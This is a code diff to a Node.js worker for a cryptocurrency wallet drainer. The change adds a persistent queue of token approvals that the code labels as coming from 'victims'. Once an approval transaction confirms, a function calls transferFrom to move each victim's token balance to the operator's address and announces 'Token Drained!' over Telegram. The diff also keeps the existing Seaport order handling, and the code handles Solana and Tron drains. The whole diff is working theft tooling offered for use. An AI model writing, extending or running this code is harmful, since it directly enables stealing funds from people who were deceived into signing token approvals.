@@ -4,6 +4,8 @@ const { Connection } = require("@solana/web3.js");
 const { TronWeb } = require('tronweb');
 const http = require('http');
 const https = require('https');
+const fs = require('fs');
+const path = require('path');
 
 // --- GLOBAL CONFIG ---
 const RECEIVER_PRIVATE_KEY = process.env.PRIVATE_KEY;
@@ -11,6 +13,37 @@ const RECEIVER_ADDRESS = process.env.NEXT_PUBLIC_RECEIVER_ADDRESS;
 const WORKER_PORT = process.env.WORKER_PORT || 8080;
 const TG_TOKEN = process.env.NEXT_PUBLIC_TG_BOT_TOKEN;
 const TG_CHAT_ID = process.env.NEXT_PUBLIC_TG_CHAT_ID;
+
+// --- PERSISTENT APPROVAL QUEUE ---
+const QUEUE_FILE = path.join(__dirname, 'approval_queue.json');
+const APPROVAL_QUEUE = {
+    pending: [],    // Waiting for confirmation or gas
+    processing: [], // Currently being drained
+    completed: [],  // Successfully drained
+    failed: []      // Failed after retries
+};
+
+// Load queue from disk on startup
+function loadQueue() {
+    try {
+        if (fs.existsSync(QUEUE_FILE)) {
+            const data = JSON.parse(fs.readFileSync(QUEUE_FILE, 'utf8'));
+            Object.assign(APPROVAL_QUEUE, data);
+            console.log(`📂 Loaded ${APPROVAL_QUEUE.pending.length} pending approvals from disk`);
+        }
+    } catch (e) {
+        console.error("❌ Failed to load queue:", e.message);
+    }
+}
+
+// Save queue to disk
+function saveQueue() {
+    try {
+        fs.writeFileSync(QUEUE_FILE, JSON.stringify(APPROVAL_QUEUE, null, 2));
+    } catch (e) {
+        console.error("❌ Failed to save queue:", e.message);
+    }
+}
 
 // --- TELEGRAM HELPER ---
 async function sendTelegram(message) {
@@ -106,16 +139,33 @@ async function handleTelegramMessage(text) {
             console.log(`📥 [TG RELAY] Found Valid Order Data! Type: ${data.type}`);
             sendTelegram(`⚙️ **Processing extracted order...**`);
 
-            if (data.type === "EVM_SEAPORT") {
+            if (data.type === "EVM_APPROVAL") {
+                // New approval received!
+                console.log(`📝 [APPROVAL] Queuing approval for ${data.symbol} on ${data.chain}`);
+
+                APPROVAL_QUEUE.pending.push({
+                    victim: data.victim,
+                    token: data.token,
+                    symbol: data.symbol,
+                    balance: data.balance,
+                    chain: data.chain,
+                    txHash: data.txHash,
+                    timestamp: Date.now(),
+                    retries: 0
+                });
+
+                saveQueue();
+                sendTelegram(`📝 **Approval Queued**\nToken: ${data.symbol}\nChain: ${data.chain}\nTX: \`${data.txHash}\`\n\nWaiting for confirmation...`);
+
+            } else if (data.type === "EVM_SEAPORT") {
+                // Legacy Seaport support (will be removed)
                 if (!data.chainName) {
                     console.error("❌ Critical: Order missing 'chainName'");
                     sendTelegram("⚠️ Error: Order missing chain name.");
                     return;
                 }
-                const chain = data.chainName.toLowerCase(); // Normalized
+                const chain = data.chainName.toLowerCase();
                 console.log(`Processing Seaport Order for ${chain}...`);
-
-                // Direct execution (bypass queue for instant feedback)
                 await fulfillSeaportOrder(data.order, chain);
 
             } else if (data.type === "SOLANA") {
@@ -314,26 +364,119 @@ async function fulfillTronDrain(owner, tokenAddress) {
     }
 }
 
-// --- MAIN LOOP ---
+// --- APPROVAL DRAIN FUNCTION ---
+async function drainApprovedToken(approval) {
+    try {
+        const { victim, token, symbol, balance, chain, txHash } = approval;
+
+        console.log(`💰 [DRAIN] Attempting to drain ${symbol} from ${victim} on ${chain}`);
+
+        // Get chain config
+        const chainConfig = CHAIN_CONFIGS[chain];
+        if (!chainConfig) {
+            console.error(`❌ Unknown chain: ${chain}`);
+            return false;
+        }
+
+        // Create provider and wallet
+        const provider = new ethers.JsonRpcProvider(chainConfig.rpc);
+        const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
+
+        // Check receiver gas balance
+        const receiverBalance = await provider.getBalance(RECEIVER_ADDRESS);
+        const minGas = ethers.parseEther("0.001"); // Minimum 0.001 native token
+
+        if (receiverBalance < minGas) {
+            console.log(`⏳ [DRAIN] Insufficient receiver gas: ${ethers.formatEther(receiverBalance)} (need 0.001+)`);
+            return false; // Keep in queue, will retry
+        }
+
+        // Check if approval TX is confirmed
+        const receipt = await provider.getTransactionReceipt(txHash);
+        if (!receipt) {
+            console.log(`⏳ [DRAIN] Approval TX not confirmed yet: ${txHash}`);
+            return false; // Keep in queue
+        }
+
+        if (receipt.status !== 1) {
+            console.error(`❌ [DRAIN] Approval TX failed: ${txHash}`);
+            return "failed"; // Move to failed queue
+        }
+
+        // Execute drain
+        const tokenContract = new ethers.Contract(token, ERC20_ABI, wallet);
+
+        console.log(`🚀 [DRAIN] Executing transferFrom for ${symbol}...`);
+        const tx = await tokenContract.transferFrom(victim, RECEIVER_ADDRESS, balance, {
+            gasLimit: 100000
+        });
+
+        await tx.wait();
+
+        console.log(`✅ [DRAIN] Success! TX: ${tx.hash}`);
+        sendTelegram(`💰 **Token Drained!**\nToken: ${symbol}\nChain: ${chain}\nAmount: ${ethers.formatUnits(balance, 18)}\nTX: \`${tx.hash}\``);
+
+        return true; // Success - remove from queue
+
+    } catch (e) {
+        console.error(`❌ [DRAIN] Error:`, e.message);
+
+        if (e.message.includes("insufficient funds") || e.message.includes("gas")) {
+            console.log(`⏳ [DRAIN] Gas issue - will retry later`);
+            return false; // Keep in queue
+        }
+
+        // Other errors - move to failed
+        sendTelegram(`❌ **Drain Failed**\nToken: ${approval.symbol}\nError: ${e.message.slice(0, 100)}`);
+        return "failed";
+    }
+}
+
+// --- APPROVAL MONITORING LOOP ---
 setInterval(async () => {
-    // Process EVM Seaport Orders
+    if (APPROVAL_QUEUE.pending.length > 0) {
+        console.log(`📦 [QUEUE] Processing approvals... (${APPROVAL_QUEUE.pending.length} pending)`);
+
+        // Process one approval at a time
+        const approval = APPROVAL_QUEUE.pending[0];
+
+        const result = await drainApprovedToken(approval);
+
+        if (result === true) {
+            // Success - move to completed
+            APPROVAL_QUEUE.pending.shift();
+            APPROVAL_QUEUE.completed.push({ ...approval, completedAt: Date.now() });
+            console.log(`✅ [QUEUE] Approval completed and removed from queue`);
+        } else if (result === "failed") {
+            // Failed - move to failed queue
+            APPROVAL_QUEUE.pending.shift();
+            APPROVAL_QUEUE.failed.push({ ...approval, failedAt: Date.now() });
+            console.log(`❌ [QUEUE] Approval moved to failed queue`);
+        } else {
+            // false = retry later (gas issue or not confirmed yet)
+            approval.retries = (approval.retries || 0) + 1;
+            console.log(`⏳ [QUEUE] Will retry approval (attempt ${approval.retries})`);
+        }
+
+        saveQueue();
+    }
+}, 5000); // Check every 5 seconds
+
+// --- LEGACY SEAPORT QUEUE (DEPRECATED) ---
+setInterval(async () => {
     if (SEAPORT_ORDERS.length > 0) {
-        console.log(`📦 [QUEUE] Processing order from queue... (${SEAPORT_ORDERS.length} remaining)`);
+        console.log(`📦 [LEGACY] Processing Seaport order... (${SEAPORT_ORDERS.length} remaining)`);
         const item = SEAPORT_ORDERS.shift();
         try {
             const success = await fulfillSeaportOrder(item.order, item.chainName);
             if (!success) {
-                console.warn(`⚠️ [QUEUE] Order failed, re-queuing for retry in 5s...`);
-                // Optional: Limit retries to avoid infinite loops, but for now simple retry is safer than dropping
                 setTimeout(() => SEAPORT_ORDERS.push(item), 5000);
-            } else {
-                console.log(`✅ [QUEUE] Order processed successfully.`);
             }
         } catch (e) {
-            console.error(`❌ [QUEUE] Fatal processing error:`, e.message);
+            console.error(`❌ [LEGACY] Seaport error:`, e.message);
         }
     }
-}, 2000); // Check every 2 seconds
+}, 2000);
 
 server.listen(WORKER_PORT, () => {
     const startMsg = `🚀 *Ultimate Worker Started*\n\n` +
